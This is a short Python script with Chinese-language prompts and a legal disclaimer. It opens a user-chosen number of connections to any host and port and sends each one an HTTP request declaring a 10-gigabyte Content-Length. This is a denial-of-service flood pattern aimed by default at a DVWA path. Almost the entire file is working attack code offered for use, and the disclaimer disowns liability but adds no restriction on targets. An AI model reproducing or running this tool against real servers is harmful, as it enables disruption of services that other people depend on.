import socket
from tkinter import messagebox
import time
print("請不要使用本工具進行違法操作")
messagebox.askquestion('使用者協定', '本軟件遵守《中華人民共和國計刑法》第二百八十六條，且本軟件非故意製作、違反國家規定（如果您在其他國家，請遵守當地法律）')
messagebox.askquestion('提示','本軟體作者均不承擔任何法律責任')
print('啟動中')
CONN = int(input("連接數量     :"))
HOST = input("IP或功能變數名稱             :")
PORT = int(input("埠號           :"))
PAGE = "/DVWA"
buf = ("GET %s HTTP/1.1\r\n"
          "Host: %s\r\n"
          "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:52.0 Gecko/20100101 Firefox/52.0\r\n"
          "Content-Length: 10000000000\r\n"
          "\r\n" % (PAGE, HOST))
socks = []
for i in range(CONN):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect((HOST, PORT))
         s.send(bytes(buf, encoding='utf-8'))
         print("[+] HTTP:Send Success!,conn=%d" % i)
         socks.append(s)
         s.close()
     except Exception as ex:
         print("[-] HTTP:Send Failure!,ERROR:%s" % ex)
         time.sleep(2)
                    